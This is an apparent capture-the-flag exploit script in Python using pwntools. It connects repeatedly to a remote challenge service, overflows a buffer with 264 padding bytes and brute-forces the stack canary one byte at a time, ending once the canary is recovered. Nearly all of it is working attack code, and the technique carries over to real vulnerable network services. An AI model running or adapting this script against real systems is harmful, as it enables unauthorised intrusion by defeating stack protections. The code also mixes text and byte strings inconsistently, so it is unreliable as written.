from pwn import *

def connect():
    r=remote('ctf.adl.tw',10003)
    return r

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("~>")
            r.send(b"printf")
            r.send(base + chr(guess))

            if b"A" in r.clean():
                print ("Guessed correct byte:", format(guess, '02x'))
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print ("FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary))
    return base
    
canary_offset = 264
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_canary[len(base_canary)-8:]) #Get the canary